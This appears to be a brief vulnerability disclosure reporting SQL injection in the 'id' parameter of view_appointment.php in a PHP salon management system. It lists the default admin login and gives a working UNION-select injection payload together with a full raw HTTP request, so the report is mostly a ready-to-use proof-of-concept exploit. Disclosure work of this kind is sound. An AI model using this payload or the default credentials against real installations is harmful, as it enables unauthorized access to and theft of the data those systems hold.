# Simple Online Men's Salon Management System v1.0 by Sourcecodester has SQL injection 3

Bug_author: Liu Lanling

vendors: https://www.sourcecodester.com/php/15069/simple-online-mens-salon-management-system-php-free-source-code.html

Login account:admin/admin123

dbname=msms_db

Vulnerability File: /msms/admin/appointments/view_appointment.php

Vulnerability location: /msms/admin/appointments/view_appointment.php, id

[+] Payload: /msms/admin/appointments/view_appointment.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7,8,9--+ // Leak place ---> id

```sql
GET /msms/admin/appointments/view_appointment.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7,8,9--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=aql25isdr8lel085k89oteptif
Connection: close


```
<img width="1108" height="750" alt="image" src="https://github.com/user-attachments/assets/9722f8a6-d182-4f13-8a8b-e298fbf95268" />

